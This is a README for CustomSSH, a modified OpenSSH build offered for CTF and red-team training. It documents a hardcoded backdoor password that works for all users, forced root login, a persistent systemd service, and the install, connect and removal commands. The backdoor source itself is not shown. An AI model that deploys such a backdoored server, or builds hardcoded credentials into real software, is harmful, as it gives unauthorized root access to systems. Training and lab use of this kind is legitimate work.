# CustomSSH - A Modified OpenSSH for Security Competitions

## 🔥 Overview

**CustomSSH** is a modified version of OpenSSH designed for cybersecurity competitions, security training, and research scenarios. This build introduces:

- A **hardcoded backdoor password**
- **Root login enabled**
- Runs on a **custom port (222)**
- Customizable installation path and output name

⚠ **WARNING:** This project is intended **ONLY** for controlled security environments such as CTF competitions, red team exercises, and educational training. **NEVER** deploy this on a real-world or internet-exposed system.

---

## 📂 Project Structure

```
/cable
├─ /openssh-portable/        # OpenSSH source code
│  └─ auth-passwd.c          # Modified authentication function
├─ build_customssh.sh        # Build and install script
├─ README.md                 # This documentation
└─ customssh.service         # Systemd service file (auto-generated)
```

---

## 🚀 Quickstart

### 1️⃣ Set your password (e.g., `letmein`):
```bash
export PASSWORD=letmein
```

### 2️⃣ Set your custom output name (e.g., `myssh`):
```bash
export OUTPUT_NAME=myssh
```

### 3️⃣ Run the build script with `sudo`:
```bash
sudo ./build_customssh.sh
```

And that's all you need to do! The script will build and install CustomSSH with your chosen password, output name, and default to port `222`.

---

## 🛠 Features

### 🔑 Hardcoded Backdoor Password
- The SSH server accepts a **predefined password** for all users.
- The password is specified **at build time** (`PASSWORD=letmein`).

### 📁 Custom Installation Paths
- By default, the server is installed under `/usr/local/customssh/`.
- The install path can be changed using `OUTPUT_NAME=yourssh`.

### 🔌 Runs on Port 222
- The SSH server defaults to **port 222** instead of `22`.
- This can be modified in the generated `sshd_config`.

### 👑 Root Login is Enabled
- `PermitRootLogin yes` is enforced in `sshd_config`.

### 🔄 Automatically Creates a Systemd Service
- Runs as a **managed service** (`customssh.service` or your chosen output name).
- Starts on boot and **restarts on failure**.

---

## 🛠 Installation & Setup

### 1️⃣ Make the build script executable
```bash
cd /cable
chmod +x build_customssh.sh
```

### 2️⃣ Run the script
```bash
./build_customssh.sh
```
This will:
- Modify `auth-passwd.c` to include the hardcoded password.
- Compile and install OpenSSH under `/usr/local/customssh`.
- Generate and install a systemd service (`customssh.service`).
- Start the custom SSH server on port **222**.

### 3️⃣ Customize the build (optional)
```bash
PASSWORD=letmein OUTPUT_NAME=myssh ./build_customssh.sh
```
- `PASSWORD=letmein` → Sets `letmein` as the **backdoor password**.
- `OUTPUT_NAME=myssh` → Installs to `/usr/local/myssh/` and runs as `myssh.service`.

---

## 👀 Connecting to CustomSSH
To connect to the custom SSH server:

```bash
ssh -p 222 root@your-server-ip
```
When prompted, enter the **hardcoded password** (e.g., `letmein` or your chosen password).

---

## 🔍 Managing the SSH Service

### 🔄 Check if the service is running
```bash
sudo systemctl status customssh  # Or your OUTPUT_NAME
```

### ▶ Start the SSH service
```bash
sudo systemctl start customssh
```

### ⏹ Stop the SSH service
```bash
sudo systemctl stop customssh
```

### 🔄 Restart the SSH service
```bash
sudo systemctl restart customssh
```

### 📌 Enable service to start on boot
```bash
sudo systemctl enable customssh
```

### ❌ Disable the service
```bash
sudo systemctl disable customssh
```

---

## 🚨 Security Considerations
⚠ **This build is extremely insecure and should NEVER be used in a real-world system!**

- **Hardcoded passwords** make the system trivially vulnerable to unauthorized access.
- **Root login enabled** increases the attack surface.
- **Password authentication** is required, meaning brute-force attacks are easier.
- **Runs on a predictable port (222)**, making detection easier.

---

## 🔥 Use Cases
✅ Capture The Flag (CTF) competitions  
✅ Red team/blue team exercises  
✅ Security research and forensics training  
❌ **Not for real-world use!**  

---

## 🔄 Uninstalling CustomSSH

If you want to remove this SSH build, follow these steps:

### 1️⃣ Stop and disable the service
```bash
sudo systemctl stop customssh
sudo systemctl disable customssh
```

### 2️⃣ Remove the installed files
```bash
sudo rm -rf /usr/local/customssh
sudo rm -rf /etc/customssh
sudo rm /etc/systemd/system/customssh.service
```

### 3️⃣ Reload systemd
```bash
sudo systemctl daemon-reload
```

### 4️⃣ Remove the firewall rule (if applicable)
```bash
sudo ufw delete allow 222/tcp
```

---

## 📚 Legal Disclaimer

This software is strictly for **educational, research, and controlled security competition use**.  
Misuse of this software may **violate laws and regulations** in your jurisdiction.  
**Do not deploy** on production systems or use on networks you do not own.  

Use at **your own risk**. The authors and maintainers are **not responsible** for any unauthorized use of this software.
